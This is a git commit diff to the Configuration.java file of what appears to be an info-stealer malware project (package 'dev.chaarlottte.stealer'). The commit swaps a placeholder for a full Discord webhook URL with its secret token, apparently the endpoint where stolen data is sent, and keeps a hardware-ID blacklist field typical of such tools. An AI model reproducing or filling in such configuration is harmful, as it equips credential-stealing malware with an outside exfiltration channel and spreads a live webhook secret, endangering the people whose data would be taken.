f080613c962288e330b2b74c34bcbadc7c7c23a8
IncognitoUser1 <118037482+IncognitoUser1@users.noreply.github.com>
2022-11-12 17:56:46 +1300

    Update Configuration.java

--- src/dev/chaarlottte/stealer/Configuration.java
+++ src/dev/chaarlottte/stealer/Configuration.java
@@ -1,7 +1,7 @@
 package dev.chaarlottte.stealer;
 
 public class Configuration {
-    public static String WEBHOOK_URL = "no";
+    public static String WEBHOOK_URL = "https://discord.com/api/webhooks/1021019265098321952/-0v927ETDnl_PZwMaUeBKFjjQV2OGjjVar2v74zViHQ-Ah55EtNTuzb5Yd0-7yHxzXVE";
 
     public static String[] blacklistedHwids = new String[] { };
 
